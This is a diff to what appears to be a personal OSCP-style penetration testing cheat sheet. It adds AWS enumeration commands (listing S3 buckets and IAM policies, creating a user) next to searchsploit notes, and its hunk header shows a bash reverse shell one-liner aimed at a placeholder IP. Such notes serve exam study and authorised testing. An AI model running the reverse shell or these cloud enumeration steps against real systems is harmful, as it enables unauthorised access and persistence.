@@ -264,6 +264,17 @@ bash -i >& /dev/tcp/IP/9999 0>&1
  -   searchsploit -m 7618 — Paste the exploit in the current directory
  -   searchsploit -p 7618[.c] — Show complete path
  -   searchsploit — nmap file.xml — Search vulns inside a Nmap XML result
+ 
+ # AWS
+ -    List of S3 buckets: aws s3api list-buckets --query "Buckets[].Name"
+
+  -  User Policies: aws iam list-user-policies
+
+   - Role Policies: aws iam list-role-policies
+
+    - Group policies: aws iam list-group-policies
+
+   - Create user: aws iam create-user
  ### Cool links: 
  https://arnavtripathy98.medium.com/my-oscp-struggle-210a4496ffe8
  - https://guif.re/linuxeop
